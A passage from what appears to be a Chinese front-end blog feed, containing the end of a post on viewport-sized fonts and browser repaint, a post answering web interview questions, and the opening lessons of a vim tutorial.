class="attribute">padding</span>: <span class="number">0</span>;&#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.wrap</span> &#123; <span class="attribute">background</span>: blue; <span class="attribute">width</span>: <span class="number">100%</span>;&#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.box</span> &#123; <span class="attribute">width</span>: <span class="number">900px</span>; <span class="attribute">height</span>: <span class="number">200px</span>;&#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrap&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>DEMO地址：<a href="http://qianduannotes.sinaapp.com/test/paintBug.html" target="_blank">http://qianduannotes.sinaapp.com/test/paintBug.html</a></strong>　　</p><p>box的宽度设置为900px，wrap设置为100%；缩小浏览器窗口，当宽度小于900时会出现滚动条，向右滚动，会发现蓝色部分并不是100%，这个问题大家可以去思考下。</p><h3>bug处理</h3><p>回到上面的问题，font-size:4vw，应该会使得字体的大小变化，可是他没有，和标准说的不一样，所以可以认为是一个bug。</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">window.onresize <span class="operator">=</span> function()&#123;</span><br><span class="line">    var box <span class="operator">=</span> document.getElementById(<span class="string">&quot;box&quot;</span>)<span class="comment">;</span></span><br><span class="line">    box.style[<span class="string">&quot;z-index&quot;</span>] <span class="operator">=</span> <span class="number">1</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;z-index可以对应的元素被重绘（repaint）。</p><p>&nbsp;延伸一点点关于重绘（repaint）和回流（reflow）的知识：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="number">1</span>. 添加、删除元素(回流+重绘)</span><br><span class="line">    <span class="number">2</span>. 隐藏元素，display:none(回流+重绘)，visibility:hidden(只重绘，不回流)</span><br><span class="line">    <span class="number">3</span>. 移动元素，比如改变top,left(jquery的animate方法就是,改变top,left不一定会影响回流)，或者移动元素到另外<span class="number">1</span>个父元素中。(重绘+回流)</span><br><span class="line">    <span class="number">4</span>. 对style的操作(对不同的属性操作，影响不一样)</span><br><span class="line">    <span class="number">5</span>. 还有一种是用户的操作，比如改变浏览器大小，改变浏览器的字体大小等(回流+重绘)</span><br><span class="line">    让我们看看下面的代码是如何影响回流和重绘的:</span><br><span class="line">var s = document.body.style;</span><br><span class="line">s.padding = <span class="string">&quot;2px&quot;</span>; <span class="regexp">//</span> 回流+重绘</span><br><span class="line">s.border = <span class="string">&quot;1px solid red&quot;</span>; <span class="regexp">//</span> 再一次 回流+重绘</span><br><span class="line">s.color = <span class="string">&quot;blue&quot;</span>; <span class="regexp">//</span> 再一次重绘</span><br><span class="line">s.backgroundColor = <span class="string">&quot;#ccc&quot;</span>; <span class="regexp">//</span> 再一次 重绘</span><br><span class="line">s.fontSize = <span class="string">&quot;14px&quot;</span>; <span class="regexp">//</span> 再一次 回流+重绘</span><br><span class="line"><span class="regexp">//</span> 添加node，再一次 回流+重绘</span><br><span class="line"></span><br><span class="line">关于重绘和回流</span><br></pre></td></tr></table></figure><h3>&nbsp;其他方案</h3><p><strong>1. css expression</strong>， 这个效率比较低，不推荐使用</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#box &#123; <span class="attr">star</span>:<span class="title function_">expression</span>(onresize = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> res = <span class="built_in">parseInt</span>(<span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">width</span>) / <span class="number">20</span>;</span><br><span class="line">                res = res &lt; <span class="number">9</span> : <span class="string">&quot;9px&quot;</span> ? res + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">fontSize</span> = res;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;<span class="comment">//P.S:上面代码没测试，不知道写错没有</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>与其说用的css，还不如说是JS，而且是效率不够的JS。</p><p><strong>2. media query</strong>，这东西也不是特别好用</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h2</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>:<span class="number">25px</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">850px</span>)&#123;<span class="comment">/* 可视区域小于 850px, 设置更小font-size属性 */</span></span><br><span class="line">   <span class="selector-tag">h2</span>&#123;</span><br><span class="line">     <span class="attribute">font-size</span>:<span class="number">19px</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用media query会使得字体的变化出现不连贯性，而且要可能设置多个@media，相当麻烦。</p><p><strong>3. media query + -webkit-transition&nbsp;</strong>实现平滑转变</p><p><strong>&nbsp;DEMO地址：</strong><a href="http://qianduannotes.sinaapp.com/test/fontResize2.html" target="_blank">http://qianduannotes.sinaapp.com/test/fontResize2.html</a></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">40px</span>;</span><br><span class="line">    -webkit-<span class="attribute">transition</span>:font-size <span class="number">0.2s</span> ease-out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">1200px</span>) &#123; <span class="selector-tag">div</span>&#123; <span class="attribute">font-size</span>: <span class="number">39px</span>; &#125;&#125;</span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">1100px</span>) &#123; <span class="selector-tag">div</span>&#123; <span class="attribute">font-size</span>: <span class="number">38px</span>; &#125;&#125;</span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">1000px</span>) &#123; <span class="selector-tag">div</span>&#123; <span class="attribute">font-size</span>: <span class="number">37px</span>; &#125;&#125;</span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">900px</span>) &#123; <span class="selector-tag">div</span>&#123; <span class="attribute">font-size</span>: <span class="number">36px</span>; &#125;&#125;</span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">800px</span>) &#123; <span class="selector-tag">div</span>&#123; <span class="attribute">font-size</span>: <span class="number">35px</span>; &#125;&#125;</span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">700px</span>) &#123; <span class="selector-tag">div</span>&#123; <span class="attribute">font-size</span>: <span class="number">34px</span>; &#125;&#125;</span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">600px</span>) &#123; <span class="selector-tag">div</span>&#123; <span class="attribute">font-size</span>: <span class="number">33px</span>; &#125;&#125;</span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">500px</span>) &#123; <span class="selector-tag">div</span>&#123; <span class="attribute">font-size</span>: <span class="number">32px</span>; &#125;&#125;</span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">400px</span>) &#123; <span class="selector-tag">div</span>&#123; <span class="attribute">font-size</span>: <span class="number">31px</span>; &#125;&#125;</span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">300px</span>) &#123; <span class="selector-tag">div</span>&#123; <span class="attribute">font-size</span>: <span class="number">30px</span>; &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>小结</h3><p>这玩意儿其实也没太大作用，用JS处理相当简单，<span>不知道大家还有没有其他比较好的方案，可以提出来交流下~</span></p><h3>参考文档</h3><p><span>&nbsp; *&nbsp;</span><a href="http://css-tricks.com/viewport-sized-typography/" target="_blank">Viewport Sized Typography</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈叶小钗面试的几个问题</title>
      <link href="/blog/2013/06/27/cb-answers/"/>
      <url>/blog/2013/06/27/cb-answers/</url>
      
        <content type="html"><![CDATA[<h3><strong>问题：</strong></h3><p>链接地址：<a title="试题" href="http://www.cnblogs.com/yexiaochai/p/3158443.html" target="_blank">http://www.cnblogs.com/yexiaochai/p/3158443.html</a></p><p><strong>① 作用域问题</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">6</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(a);</span><br><span class="line">    a = <span class="number">666</span>;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line">a = <span class="number">66</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题，我可耻的没有答起，我面试结束刚刚上出租就知道这道题很水了。。。。考察作用域的，当时活生生的被大神气场照住了，周围人的集体智商都减低了！！！</p><p><strong>② 语义化标签</strong></p><p>这道题我确实没辙，之前其实差点写类似的博客，却没有写，今天结束后补上吧！</p><p>1）tite与h1的区别</p><p>2）b与strong的区别</p><p>3）i与em的区别</p><p>PS：不要小看这些题，80%人答不上来</p><p><strong>③ 事件绑定</strong></p><p>addEventListener，第三个参数是用来表示事件是以事件冒泡还是事件捕获这个各位都知道！但是他问的问题是：</p><p>我们给一个dom同时绑定两个点击事件，一个用捕获，一个用冒泡，你来说下会执行几次事件，然后会先执行冒泡还是捕获！！！</p><p>来吧，谁能说出来。。。。</p><p><strong>④ CSS选择器问题</strong></p><p>考察优先级问题，反正会出很多莫名其妙的变形，比如将style标签写在body后与body前有什么区别，比如同一dom应用多个class其应该如何表现，比如class a定义颜色为blue，class b定义颜色为red，同时应用到dom上，dom作何显示。。。</p><p>好吧各位去回答吧。。。。。</p><h3><strong>浅见：</strong></h3><p><strong>1. JS单线程</strong></p><p>setTimeout加入到队列的后面 所以结果是66如果题目是这样</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">6</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(a);</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">666</span>;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line">a = <span class="number">66</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果就是undefined（变量提升）</p><p><strong>2. 标签语义化</strong>1）你是不是写错了？title和alt的区别吧？2）和3），-&gt;语气</p><p>b和i，一个是加粗，一个是斜体，都是视觉上的效果，而em和strong有情感色彩加强P.S：记得strong在IE和chrome显示不同，一个加粗一个未加粗</p><p><strong>3. 冒泡和捕捉</strong></p><p>addEventListener绑定几次就执行几次，即便绑定的函数一样也会多次执行，结果应该是先显示捕捉再显示冒泡冒泡，需要先冒泡到根节点（document，部分浏览器是html节点），再向下，碰到有绑定的DOM就执行；而捕捉是直接从根节点开始（这里我理解的也不是很深入）</p><p>p.s：请移步<a href="http://www.cnblogs.com/yexiaochai/archive/2013/06/30/3163370.html" target="_blank">http://www.cnblogs.com/yexiaochai/archive/2013/06/30/3163370.html</a></p><p><strong>4.css渲染</strong></p><p>如果写在body后会重新渲染整个页面；同一个DOM同时应用多个class，样式都会应用，重复的样式会覆盖</p><p>总体感觉面试的题目还是比较基础吧~</p><p>呵呵，我前几天也被阿里面了，比较幸运的拿到了offer</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim操作全面讲解</title>
      <link href="/blog/2013/06/11/cb-linux-learning-details/"/>
      <url>/blog/2013/06/11/cb-linux-learning-details/</url>
      
        <content type="html"><![CDATA[<p><strong>目录</strong></p><p><a href="#skyking-1">第一讲</a></p><ul><li><ul><li><a href="#skyking-1-1">移动光标</a></li><li><a href="#skyking-1-2">VIM的进入和退出</a></li><li><a href="#skyking-1-3">文本编辑之删除</a></li><li><a href="#skyking-1-4">文本编辑之插入</a></li><li><a href="#skyking-1-5">小结</a></li></ul></li></ul><p><a href="#skyking-2">第二讲</a></p><ul><li><ul><li><a href="#skyking-2-1">删除类命令</a></li><li><a href="#skyking-2-2">其他删除类命令</a></li><li><a href="#skyking-2-3">关于命令和对象</a></li><li><a href="#skyking-2-4">对象命令的特殊情况</a></li><li><a href="#skyking-2-5">撤消类命令</a></li><li><a href="#skyking-2-6">小结</a></li></ul></li></ul><p><a href="#skyking-3">第三讲</a></p><ul><li><ul><li><a href="#skyking-3-1">置入类命令</a>&nbsp;</li><li><a href="#skyking-3-2">替换类命令</a>&nbsp;</li><li><a href="#skyking-3-3">更改类命令&nbsp;</a></li><li><a href="#skyking-3-4">使用c指令的其他更改类命令&nbsp;</a></li><li><a href="#skyking-3-5">小结&nbsp;</a></li></ul></li></ul><p><a href="#skyking-4">第四讲</a></p><ul><li><ul><li><a href="#skyking-4-1">定位及文件状态&nbsp;</a></li><li><a href="#skyking-4-2">搜索类命令&nbsp;</a></li><li><a href="#skyking-4-3">配对括号的查找&nbsp;</a></li><li><a href="#skyking-4-4">修正错误的方法之一&nbsp;</a></li><li><a href="#skyking-4-5">小结</a></li></ul></li></ul><p><a href="#skyking-5">第五讲</a></p><ul><li><ul><li><a href="#skyking-5-1">VIM 内执行外部命令的方法&nbsp;</a></li><li><a href="#skyking-5-2">关于保存文件的更多信息&nbsp;</a></li><li><a href="#skyking-5-3">一个具有选择性的保存命令&nbsp;</a></li><li><a href="#skyking-5-4">提取和合并文件&nbsp;</a></li><li><a href="#skyking-5-5">小结&nbsp;</a></li></ul></li></ul><p><a href="#skyking-6">第六讲</a></p><ul><li><ul><li><a href="#skyking-6-1">打开类命令</a>&nbsp;</li><li><a href="#skyking-6-2">光标后插入类命令&nbsp;</a></li><li><a href="#skyking-6-3">另外一个置换类命令的版本设置类命令的选项</a>&nbsp;</li><li><a href="#skyking-6-4">小结</a></li></ul></li></ul><p><a href="#skyking-7">第七</a><a href="#skyking-7">讲</a><a href="#skyking-7"> 在线帮助命令</a>&nbsp;</p><p><a href="#skyking-8">第八</a><a href="#skyking-8">讲</a><a href="#skyking-8"> 创建一个启动脚本</a></p><p><span>vim 是一个具有很多命令的功能非常强大的编辑器。限于篇幅，在本教程当中</span><span>就不详细介绍了。本教程的设计目标是</span><span>讲述一些必要的基本命令</span><span>，而掌握好这些命令，您就能够很容易将vim当作一个通用的万能编辑器来使用了。</span></p><p>完成本教程的内容大约需要<span>25-30</span>分钟，取决于您训练的时间。</p><p>每一节的命令操作将会更改本文。推荐您复制本文的一个副本，然后在副本上进行训练(如果您是通过"vimtutor"来启动教程的，那么本文就已经是副本了)。</p><p><span> 切记一点∶本教程的设计思路是在使用中进行学习的。</span>也就是说，您需要通过执行命令来学习它们本身的正确用法。如果您只是阅读而不操作，那么您可能会很快遗忘这些命令的！</p><p>好了，现在请确定您的Shift-Lock(大小写锁定键)还没有按下，然后按键盘上的字母键 j 足够多的次数来移动光标，直到第一节的内容能够完全充满屏幕。</p><h3><a id="skyking-1" name="skyking-1" href="#">&nbsp;</a>      第一讲&nbsp;</h3><p><strong>第一节∶移动光标</strong><a id="skyking-1-1" name="skyking-1-1" href="#">&nbsp;</a></p><p><span>※※ 要移动光标，请依照说明分别按下 h、j、k、l 键。 ※※</span></p><p>      ^       k        提示∶ h 的键位于左边，每次按下就会向左移动。       &lt; h  l &gt;      l 的键位于右边，每次按下就会向右移动。      j         j 键看起来很象一支尖端方向朝下的箭头。      v</p><p>  1. 请随意在屏幕内移动光标，直至您觉得舒服为止。</p><p>  2. 按下下行键(j)，直到出现光标重复下行。</p><p>---&gt; 现在您应该已经学会如何移动到下一讲吧。</p><p>  3. 现在请使用下行键，将光标移动到第二讲。</p><p><em><strong>提示∶</strong>如果您不敢确定您所按下的字母，请按下&lt;ESC&gt;键回到正常(Normal)模式。然后再次从键盘输入您想要的命令。</em></p><p><em><strong>提示∶</strong>光标键应当也能正常工作的。但是使用hjkl键，在习惯之后您就能够快速地在屏幕内四处移动光标了。</em></p><p><strong>第二节∶VIM的进入和退出<a id="skyking-1-2" name="skyking-1-1" href="#">&nbsp;</a></strong></p><p><span>!! 特别提示∶敬请阅读完整本一节的内容，然后才能执行以下所讲解的命令。</span></p><p>  1. 请按&lt;ESC&gt;键(这是为了确保您处在正常模式)。</p><p>  2. 然后输入∶<span>     :q! &lt;回车&gt;</span></p><p>---&gt; 这种方式的退出编辑器绝不会保存您进入编辑器以来所做的改动。     如果您想保存更改再退出，请输入∶       <span>:wq  &lt;回车&gt;</span></p><p>  3. 如果您看到了命令行提示符，请输入能够带您回到本教程的命令，那就是∶</p><p><span>   vimtutor &lt;回车&gt;</span></p><p>     通常情况下您也可以用这种方式∶</p><p><span>   vim tutor &lt;回车&gt;</span></p><p>---&gt; 这里的 'vim' 表示进入vim编辑器，而 'tutor'则是您准备要编辑的文件。</p><p>  4. 如果您自信已经牢牢记住了这些步骤的话，请从步骤1执行到步骤3退出，然     后再次进入编辑器。接着将光标移动到第一讲第三节来继续我们的教程讲解。</p><p><strong>第三节∶文本编辑之删除<strong><a id="skyking-1-3" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></p><p><span>** 在正常(Normal)模式下，可以按下 x 键来删除光标所在位置的字符。**</span></p><p>  1. 请将光标移动到本节中下面标记有 ---&gt; 的那一行。</p><p>  2. 为了修正输入错误，请将光标移至准备删除的字符的位置处。</p><p>  3. 然后按下 x 键将错误字符删除掉。</p><p>  4. 重复步骤2到步骤4，直到句子修正为止。</p><p>---&gt; The ccow jumpedd ovverr thhe mooon.</p><p>  5. 好了，该行已经修正了，下一节内容是第一讲第四节。</p><p><em><strong>特别提示</strong>∶在您浏览本教程时，不要强行记忆。记住一点∶在使用中学习。</em></p><p><strong>第四节∶文本编辑之插入<strong><a id="skyking-1-4" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></p><p><span>  ** 在正常模式下，可以按下 i 键来插入文本。**</span></p><p>  1. 请将光标移动到本节中下面标记有 ---&gt; 的第一行。</p><p>  2. 为了使得第一行内容雷同于第二行，请将光标移至文本第一个字符准备插入     的位置。</p><p>  3. 然后按下 i 键，接着输入必要的文本字符。</p><p>  4. 所有文本都修正完毕，请按下 &lt;ESC&gt; 键返回正常模式。重复步骤2至步骤4以便修正句子。</p><p>---&gt; There is text misng this .---&gt; There is some text missing from this line.</p><p>  5. 如果您对文本插入操作已经很满意，请接着阅读下面的小结。</p><p><strong>            第一讲小结<strong><a id="skyking-1-5" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></p><p>  1. 光标在屏幕文本中的移动既可以用箭头键，也可以使用 hjkl 字母键。   h (左移) j (下行)       k (上行)     l (右移)</p><p>  2. 欲进入vim编辑器(从命令行提示符)，请输入∶<span>vim 文件名 &lt;回车&gt;</span></p><p>  3. 欲退出vim编辑器，请输入以下命令放弃所有修改∶</p><p><span> &lt;ESC&gt;   :q!  &lt;回车&gt;</span></p><p>     或者输入以下命令保存所有修改∶</p><p><span> &lt;ESC&gt;   :wq  &lt;回车&gt;</span></p><p>  4. 在正常模式下删除光标所在位置的字符，请按∶ x</p><p>  5. 在正常模式下要在光标所在位置开始插入文本，请按∶</p><p><span>  i     输入必要文本 &lt;ESC&gt;</span></p><p>特别提示∶按下 &lt;ESC&gt; 键会带您回到正常模式或者取消一个不期望或者部分完成的命令。</p><p>好了，第一讲到此结束。下面接下来继续第二讲的内容。</p><h3><a id="skyking-2" name="skyking-2" href="#">&nbsp;</a><span>第二讲</span></h3><p><strong>第一节∶删除类命令<strong><a id="skyking-2-1" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></p><p><span>** 输入 dw 可以从光标处删除至一个单字/单词的末尾。**</span></p><p>  1. 请按下 &lt;ESC&gt; 键确保您处于正常模式。</p><p>  2. 请将光标移动到本节中下面标记有 ---&gt; 的那一行。</p><p>  3. 请将光标移至准备要删除的单词的开始。</p><p>  4. 接着输入 dw 删除掉该单词。</p><p><em><strong>  特别提示:&nbsp;</strong>您所输入的 dw 会在您输入的同时出现在屏幕的最后一行。如果您输入有误，请按下 &lt;ESC&gt; 键取消，然后重新再来。</em></p><p>---&gt; There are a some words fun that don't belong paper in this sentence.</p><p>  5. 重复步骤3至步骤4，直至句子修正完毕。接着继续第二讲第二节内容。</p><p><strong>第二节∶其他删除类命令<strong><strong><a id="skyking-2-2" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></p><p><span>** 输入 d$ 从当前光标删除到行末。**</span></p><p>  1. 请按下 &lt;ESC&gt; 键确保您处于正常模式。</p><p>  2. 请将光标移动到本节中下面标记有 ---&gt; 的那一行。</p><p>  3. 请将光标移动到该行的尾部(也就是在第一个点号"."后面)。</p><p>  4. 然后输入 d$ 从光标处删至当前行尾部。</p><p>---&gt; Somebody typed the end of this line twice. end of this line twice.</p><p>  5. 请继续学习第二讲第三节就知道是怎么回事了。</p><p><strong>第三节∶关于命令和对象<strong><strong><a id="skyking-2-3" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></p><p><span>删除命令 d 的格式如下∶</span></p><p>  [number]   d object      或者     d   [number]   object</p><p>  其意如下∶    <span>number - 代表执行命令的次数(可选项，缺省设置为 1 )。</span><span>    d - 代表删除。</span><span>    object - 代表命令所要操作的对象(下面有相关介绍)。</span></p><p>  一个简短的对象列表∶    w - 从当前光标当前位置直到单字/单词末尾，包括空格。    e - 从当前光标当前位置直到单字/单词末尾，但是 *不* 包括空格。    $ - 从当前光标当前位置直到当前行末。</p><p><em><strong>特别提示∶</strong>对于勇于探索者，请在正常模式下面仅按代表相应对象的键而不使用命令，则将看到光标的移动正如上面的对象列表所代表的一样。</em></p><p><strong><span>第四节∶对象命令的特殊情况<strong><strong><a id="skyking-2-4" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></span></strong></p><p><span>** 输入 dd 可以删除整一个当前行。 **</span></p><p>  鉴于整行删除的高频度，VIM 的设计者决定要简化整行删除，仅需要在同一行上  击打两次 d 就可以删除掉光标所在的整行了。</p><p>  1. 请将光标移动到本节中下面的短句段落中的第二行。  2. 输入 dd 删除该行。  3. 然后移动到第四行。  4. 接着输入 2dd (还记得前面讲过的 number-command-object 吗？) 删除两行。</p><p>      　　1)  Roses are red,      　　2)  Mud is fun,      　　3)  Violets are blue,      　　4)  I have a car,      　　5)  Clocks tell time,      　　6)  Sugar is sweet      　　7)  And so are you.</p><p><strong>第五节∶撤消类命令<strong><strong><a id="skyking-2-5" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></p><p><span>** 输入 u 来撤消最后执行的命令，输入 U 来修正整行。**</span></p><p>  1. 请将光标移动到本节中下面标记有 ---&gt; 的那一行，并将其置于第一个错误     处。  2. 输入 x 删除第一个不想保留的字母。  3. 然后输入 u 撤消最后执行的(一次)命令。  4. 这次要使用 x 修正本行的所有错误。  5. 现在输入一个大写的 U ，恢复到该行的原始状态。  6. 接着多次输入 u 以撤消 U 以及更前的命令。  7. 然后多次输入 CTRL-R (先按下 CTRL 键不放开，接着输入 R 键) ，这样就     可以执行恢复命令，也就是撤消掉撤消命令。</p><p>---&gt; Fiix the errors oon thhis line and reeplace them witth undo.</p><p>  8. 这些都是非常有用的命令。下面是第二讲的小结了。</p><p><strong><span>第二讲小结<strong><strong><a id="skyking-2-6" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></span></strong></p><p><span>1. 欲从当前光标删除至单字/单词末尾，请输入∶dw</span></p><p>  2. 欲从当前光标删除至当前行末尾，请输入∶d$</p><p>  3. 欲删除整行，请输入∶dd</p><p>  4. 在正常模式下一个命令的格式是∶</p><p>       [number]   command   object     或者     command  [number]   object     其意是∶       <span>number - 代表的是命令执行的次数</span><span>       command - 代表要做的事情，比如 d 代表删除</span><span>       object - 代表要操作的对象，比如 w 代表单字/单词，$ 代表到行末等等。</span><span>   $ (to the end of line), etc.</span></p><p>  5. 欲撤消以前的操作，请输入∶u (小写的u)     欲撤消在一行中所做的改动，请输入∶U (大写的U)     欲撤消以前的撤消命令，恢复以前的操作结果，请输入∶CTRL-R</p><h3><a id="skyking-3" name="skyking-3" href="#">&nbsp;</a>       第三讲</h3><p><strong>第一节∶置入类命令<strong><strong><a id="skyking-3-1" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></p><p><span>        ** 输入 p 将最后一次删除的内容置入光标之后 **</span></p><p>  1. 请将光标移动到本节中下面示范段落的首行。</p><p>  2. 输入 dd 将该行删除，这样会将该行保存到vim的缓冲区中。</p><p>  3. 接着将光标移动到准备置入的位置的上方。记住∶是上方哦。</p><p>  4. 然后在正常模式下(&lt;ESC&gt;键进入)，输入 p 将该行粘贴置入。</p><p>  5. 重复步骤2至步骤4，将所有的行依序放置到正确的位置上。</p><p>     　　d) Can you learn too?     　　b) Violets are blue,     　　c) Intelligence is learned,     　　a) Roses are red,</p><p><strong><span>第二节∶替换类命令<strong><strong><strong><a id="skyking-3-2" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></span></strong></p><p><span>** 输入 r 和一个字符替换光标所在位置的字符。**</span></p><p>  1. 请将光标移动到本节中下面标记有 ---&gt; 的第一行。</p><p>  2. 请移动光标到第一个错误的适当位置。</p><p>  3. 接着输入 r ，这样就能将错误替换掉了。</p><p>  4. 重复步骤2和步骤3，直到第一行已经修改完毕。</p><p>---&gt;  Whan this lime was tuoed in, someone presswd some wrojg keys!---&gt;  When this line was typed in, someone pressed some wrong keys!</p><p>  5. 然后我们继续学校第三讲第三节。</p><p><em><strong>特别提示∶</strong></em>切记您要在使用中学习，而不是在记忆中学习。</p><p><strong>第三节∶更改类命令<strong><strong><strong><a id="skyking-3-3" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></p><p><span>    ** 要改变一个单字/单词的部分或者全部，请输入 cw **</span></p><p>  1. 请将光标移动到本节中下面标记有 ---&gt; 的第一行。</p><p>  2. 接着把光标放在单词 lubw 的字母 u 的位置那里。</p><p>  3. 然后输入 cw 就可以修正该单词了(在本例这里是输入 ine 。)</p><p>  4. 最后按 &lt;ESC&gt; 键，然后光标定位到下一个错误第一个准备更改的字母处。</p><p>  5. 重复步骤3和步骤4，直到第一个句子完全雷同第二个句子。</p><p>---&gt; This lubw has a few wptfd that mrrf changing usf the change command.---&gt; This line has a few words that need changing using the change command.</p><p><em>提示∶请注意 cw 命令不仅仅是替换了一个单词，也让您进入文本插入状态了。</em></p><p><strong>第四节∶使用c指令的其他更改类命令<strong><strong><strong><a id="skyking-3-4" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></p><p><span>** 更改类指令可以使用同删除类命令所使用的对象参数。**</span></p><p>  1. 更改类指令的工作方式跟删除类命令是一致的。操作格式是∶</p><p>       [number]   c   object    或者     c [number]   object</p><p>  2. 对象参数也是一样的，比如 w 代表单字/单词，$代表行末等等。</p><p>  3. 请将光标移动到本节中下面标记有 ---&gt; 的第一行。</p><p>  4. 接着将光标移动到第一个错误处。</p><p>  5. 然后输入 c$ 使得该行剩下的部分更正得同第二行一样。最后按 &lt;ESC&gt; 键。</p><p>---&gt; The end of this line needs some help to make it like the second.---&gt; The end of this line needs to be corrected using the  c$  command.</p><p><strong>第三讲小结<strong><strong><strong><a id="skyking-3-5" name="skyking-1-1" href="#">&nbsp;</a></strong></strong></strong></strong></p><p><span>1. 要重新置入已经删除的文本内容，请输入小写字母 p。该操作可以将已删除</span>     的文本内容置于光标之后。如果最后一次删除的是一个整行，那么该行将置     于当前光标所在行的下一行。</p><p>  2. 要替换光标所在位置的字符，请输入小写的 r 和要替换掉原位置字符的新字     符即可。</p><p>  3. 更改类命令允许您改变指定的对象，从当前光标所在位置直到对象的末尾。     比如输入 cw 可以替换当前光标到单词的末尾的内容；输入 c$ 可以替换当     前光标到行末的内容。</p><p>  4. 更改类命令的格式是∶</p><p>  [number]   c object        或者  c   [number]   object</p><p>下面我们继续学习下一讲。</p><h3><a id="skyking-4" name="skyking-4" href="#">&nbsp;</a>第四讲</h3><p><strong>第一节∶定位及文件状态<strong><strong><strong><a id="skyking-4-1" 